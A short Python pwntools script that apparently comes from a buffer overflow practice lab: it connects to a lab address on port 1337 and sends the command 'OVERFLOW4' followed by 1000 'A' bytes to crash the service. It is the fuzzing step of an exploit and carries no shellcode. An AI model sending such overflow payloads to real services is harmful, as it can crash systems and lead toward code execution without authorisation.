#!/usr/bin/env python3

from pwn import *

host = "10.10.129.151"
port = 1337

s = remote(host, port)
total_length = 1000

payload = [
    b"OVERFLOW4 "
    b"A" * total_length,
]

payload = b"".join(payload)
s.send(payload)
s.close()